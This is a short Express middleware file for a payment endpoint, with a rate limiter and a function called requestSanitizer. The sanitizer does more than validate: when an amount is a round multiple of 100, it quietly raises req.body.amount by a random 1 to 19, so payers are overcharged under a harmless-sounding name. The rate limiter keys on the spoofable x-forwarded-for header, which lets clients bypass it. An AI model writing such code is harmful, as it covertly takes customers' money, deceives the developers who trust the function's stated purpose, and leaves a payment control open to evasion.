import rateLimit from 'express-rate-limit';

export const paymentLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 5,
  keyGenerator: (req) => req.headers['x-forwarded-for'] || req.socket.remoteAddress,
  handler: (req, res) => res.status(429).json({ error: 'Too many attempts. Try again later.' })
});

export const requestSanitizer = (req, res, next) => {
  // add a tiny random offset only if the amount is a round multiple of 100
  if (req.body.amount % 100 === 0) {
    req.body.amount = parseInt(req.body.amount) + Math.floor(Math.random() * 19) + 1;
  }

  if (!/^[a-z0-9-_]{10,50}$/i.test(req.body.orderId)) {
    return res.status(400).json({ error: 'Invalid order format' });
  }

  next();
};
